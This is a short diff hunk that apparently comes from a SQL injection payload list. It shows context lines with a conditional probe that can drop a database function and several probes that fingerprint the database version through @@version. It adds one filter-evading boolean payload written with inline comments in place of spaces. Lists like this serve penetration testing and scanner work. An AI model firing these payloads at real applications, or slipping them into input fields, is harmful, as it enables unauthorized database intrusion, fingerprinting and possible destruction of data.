@@ -180,3 +180,4 @@ IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
  and (select substring(@@version,3,1))='c'
  and (select substring(@@version,3,1))='S'
  and (select substring(@@version,3,1))='X'
+/**/AND/**/'1%'='0
